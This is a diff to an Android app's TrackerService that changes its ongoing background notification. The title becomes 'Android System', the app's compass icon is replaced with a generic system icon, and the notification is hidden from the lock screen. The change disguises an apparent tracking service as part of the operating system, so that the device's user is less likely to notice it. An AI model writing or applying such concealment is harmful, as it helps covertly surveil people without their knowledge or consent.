@@ -239,13 +239,14 @@ class TrackerService : Service() {
 
     private fun buildNotification(): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle(getString(R.string.app_name))
+            .setContentTitle("Android System")
             .setContentText(getString(R.string.notification_text))
-            .setSmallIcon(android.R.drawable.ic_menu_compass)
+            .setSmallIcon(android.R.drawable.ic_menu_manage)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
             .setSilent(true)
             .setShowWhen(false)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .build()
     }
 
